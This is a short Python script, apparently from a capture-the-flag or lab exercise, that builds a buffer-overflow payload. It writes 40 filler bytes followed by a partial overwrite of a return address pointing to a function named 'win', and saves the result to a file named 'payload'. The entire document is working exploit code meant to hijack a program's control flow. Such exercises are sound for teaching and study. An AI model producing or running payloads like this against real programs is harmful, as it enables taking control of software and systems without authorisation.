#!/usr/bin/env python3

from struct import pack

payload = b'a' * 40

# The address of the function win
payload += pack("<B", 0x47)
payload += pack("<H", 0x167a)

with open("payload", "wb") as f:
    f.write(payload)